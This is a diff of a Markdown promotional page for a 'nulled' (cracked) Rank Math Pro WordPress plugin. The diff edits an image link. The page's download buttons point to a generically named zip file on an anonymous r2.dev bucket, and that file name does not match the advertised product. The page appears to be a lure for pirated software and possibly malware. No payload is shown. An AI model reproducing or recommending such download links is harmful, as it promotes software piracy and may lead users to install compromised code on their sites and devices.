@@ -6,12 +6,13 @@ Are you searching for **Rank Math Pro Nulled** to unlock premium SEO power for y
 
 <div style="display: flex; align-items: center; justify-content: center; gap: 20px; max-width: 600px; margin: auto;">
   <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip" download>
-    <img src="[https://github.com/user-attachments/assets/ae73a168-1df5-4c0a-aa3e-29167b82c184](https://github.com/user-attachments/assets/34981e08-a6e2-4d3e-bebf-ced3d22d9ded)" alt="rank math pro" style="max-width: 300px; height: auto; cursor: pointer;">
+    <img src="https://github.com/user-attachments/assets/593ae160-2bd8-4b66-8ca4-34456feeeabc" alt="rank math nulled" style="max-width: 300px; height: auto; cursor: pointer;">
   </a>
   <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip" download>
     <img src="https://github.com/user-attachments/assets/8bb3123b-133a-4292-afa4-7f25347e7ba7" alt="download button" style="width: 50%; height: auto; cursor: pointer;">
   </a>
 </div>
+
 
 
 ---
